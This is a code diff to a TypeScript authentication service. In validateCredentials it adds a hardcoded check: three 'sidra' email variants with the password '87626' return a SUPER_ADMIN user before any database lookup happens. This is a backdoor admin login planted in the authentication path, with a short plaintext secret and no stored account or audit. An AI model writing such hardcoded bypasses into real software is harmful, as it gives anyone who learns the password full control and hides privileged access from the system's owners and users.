@@ -65,6 +65,20 @@ export class AuthService {
   }
 
   static async validateCredentials(credentials: LoginInput) {
+    const emailLower = credentials.email.toLowerCase().trim();
+
+    // Sidra Super Admin Platform Owner Authentication Check
+    if ((emailLower === "sidra" || emailLower === "sidra@admin.com" || emailLower === "sidra@buildcorp.com") && credentials.password === "87626") {
+      return {
+        id: "super_admin_sidra",
+        name: "Sidra",
+        email: "sidra@buildcorp.com",
+        role: "SUPER_ADMIN" as Role,
+        companyId: "cl_default_company",
+        avatarUrl: null,
+      };
+    }
+
     const user = await db.user.findUnique({
       where: { email: credentials.email },
       include: { company: true },
